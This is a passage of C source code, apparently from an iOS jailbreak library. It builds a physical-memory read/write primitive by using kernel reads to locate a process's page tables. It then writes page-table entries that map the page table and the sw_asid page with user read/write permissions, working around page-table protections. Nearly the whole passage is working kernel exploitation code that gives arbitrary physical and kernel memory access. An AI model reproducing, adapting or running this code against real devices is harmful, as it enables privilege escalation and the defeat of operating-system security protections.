    JBLogDebug("physrw PTE receiver preseed status=complete base=0x%llx sentinel=0x%llx "
               "layout=%s alias-capacity=%zu mapped-capacity=%zu",
               (uint64_t)base,
               (uint64_t)sentinel,
               layoutName,
               aliasCapacity,
               (size_t)PHYSRW_PTE_WINDOW_PAGE_CAPACITY);
    return 0;
}

static int physrw_pte_install_preseeded_target(uint64_t pmap,
                                               uint64_t ttep,
                                               uint64_t pageTableVirtualAddress,
                                               uint64_t *swAsidPtr) {
    if (!pageTableVirtualAddress || (pageTableVirtualAddress & L2_BLOCK_MASK) != 0) {
        return -10;
    }

    uint64_t sentinel = pageTableVirtualAddress + (L2_BLOCK_COUNT - 1) * vm_real_kernel_page_size;
    uint64_t leafLevel = PMAP_TT_L3_LEVEL;
    uint64_t leafDescriptor = 0;
    uint64_t sentinelPa = vtophys_lvl(ttep, sentinel, &leafLevel, &leafDescriptor);
    uint64_t tablePa = leafDescriptor & ~vm_real_kernel_page_mask;
    if (!sentinelPa || physread64(sentinelPa) != PRESEED_SENTINEL || leafLevel != PMAP_TT_L3_LEVEL || !tablePa) {
        return -11;
    }

    uint64_t slot0 = physread64(tablePa);
    uint64_t slot1 = physread64(tablePa + sizeof(uint64_t));
    if ((slot0 & ARM_TTE_VALID) || (slot1 & ARM_TTE_VALID))
        return -12;

    uint64_t swAsid = pmap + koffsetof(pmap, sw_asid);
    uint64_t swAsidPage = swAsid & ~vm_real_kernel_page_mask;
    uint64_t swAsidPagePa = kvtophys(swAsidPage);
    if (!swAsidPagePa)
        return -13;

    uint64_t tableKva = phystokv(tablePa);
    if (!tableKva)
        return -14;

    uint64_t userRwAttributes = PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
    int status = physrw_pte_write_protected64(tableKva, tablePa | userRwAttributes);
    if (status != 0)
        return -15;
    status = physrw_pte_write_protected64(tableKva + sizeof(uint64_t), swAsidPagePa | userRwAttributes);
    if (status != 0) {
        physrw_pte_write_protected64(tableKva, slot0);
        return -16;
    }
    __asm__ volatile("dsb ishst" ::: "memory");

    *swAsidPtr = pageTableVirtualAddress + vm_real_kernel_page_size + (swAsid & vm_real_kernel_page_mask);
    JBLogDebug("physrw PTE target window status=complete base=0x%llx table-pa=0x%llx "
               "asid-pa=0x%llx asid-pointer=0x%llx",
               pageTableVirtualAddress,
               tablePa,
               swAsidPagePa,
               *swAsidPtr);
    return 0;
}

int physrw_pte_handoff(pid_t pid, uint64_t pageTableVirtualAddress, uint64_t *swAsidPtr) {
    if (!pid || !pageTableVirtualAddress || !swAsidPtr)
        return -1;

    uint64_t proc = proc_find(pid);
    if (!proc)
        return -2;

    int ret = 0;
    do {
        uint64_t task = proc_task(proc);
        if (!task) {
            ret = -3;
            break;
        };

        uint64_t vmMap = kread_ptr(task + koffsetof(task, map));
        if (!vmMap) {
            ret = -4;
            break;
        };

        uint64_t pmap = kread_ptr(vmMap + koffsetof(vm_map, pmap));
        if (!pmap) {
            ret = -5;
            break;
        };

        uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));
        if (!ttep) {
            ret = -6;
            break;
        }

        ret = physrw_pte_install_preseeded_target(pmap, ttep, pageTableVirtualAddress, swAsidPtr);
    } while (0);

    proc_rele(proc);
    return ret;
}

int libjailbreak_physrw_pte_init(bool receivedHandoff, uint64_t asidPtr) {
    if (pthread_mutex_init(&gLock, NULL) != 0)
        return -8;
    if (pthread_mutex_init(&gGenerationLock, NULL) != 0) {
        pthread_mutex_destroy(&gLock);
        return -13;
    }
    if (physrw_pte_configure_window_mode() != 0) {
        pthread_mutex_destroy(&gGenerationLock);
        pthread_mutex_destroy(&gLock);
        return -10;
    }

    if (!receivedHandoff) {
        uint64_t pageTableVirtualAddress = 0;
        int status = physrw_pte_preseed(&pageTableVirtualAddress);
        if (status == 0) {
            status = physrw_pte_handoff(getpid(), pageTableVirtualAddress, &asidPtr);
        }
        if (status != 0) {
            if (pageTableVirtualAddress) {
                vm_deallocate(mach_task_self(), pageTableVirtualAddress, L2_BLOCK_SIZE);
            }
            pthread_mutex_destroy(&gGenerationLock);
            pthread_mutex_destroy(&gLock);
            return status;
        }
    }
    if (!asidPtr) {
        pthread_mutex_destroy(&gGenerationLock);
        pthread_mutex_destroy(&gLock);
        return -9;
    }
    uint64_t activeBase = (asidPtr & ~vm_real_kernel_page_mask) - vm_real_kernel_page_size;
    if (!activeBase || (activeBase & L2_BLOCK_MASK) != 0) {
        pthread_mutex_destroy(&gGenerationLock);
        pthread_mutex_destroy(&gLock);
        return -11;
    }
    gActiveGeneration = (physrw_pte_generation){
        .base = activeBase,
        .asidPtr = asidPtr,
        .nextSlot = gUsesSPTMGenerations ? SPTM_GENERATION_FIRST_ALIAS_SLOT : 0,
    };
    gStandbyGeneration = (physrw_pte_generation){0};
    gGenerationManagementReady = false;
    if (gUsesSPTMGenerations && !physrw_pte_generation_is_pristine(gActiveGeneration)) {
        gActiveGeneration = (physrw_pte_generation){0};
        pthread_mutex_destroy(&gGenerationLock);
        pthread_mutex_destroy(&gLock);
        return -12;
    }
    gSwAsid = (void *)(uintptr_t)asidPtr;
    gNextReclaimGroup = 0;
    gPendingReclaimGroup = -1;
    gDiagnostics = (physrw_pte_diagnostics){
        .lastReclaimGroup = -1,
    };
    gPrimitives.physreadbuf = physrw_pte_physreadbuf;
    gPrimitives.physwritebuf = physrw_pte_physwritebuf;
    gPrimitives.physaccess_mapped = physrw_pte_physaccess_mapped;
    gPrimitives.kreadbuf = NULL;
    gPrimitives.kwritebuf = NULL;
    gPrimitives.kaccess_mapped = physrw_pte_kaccess_mapped;

    return 0;
}
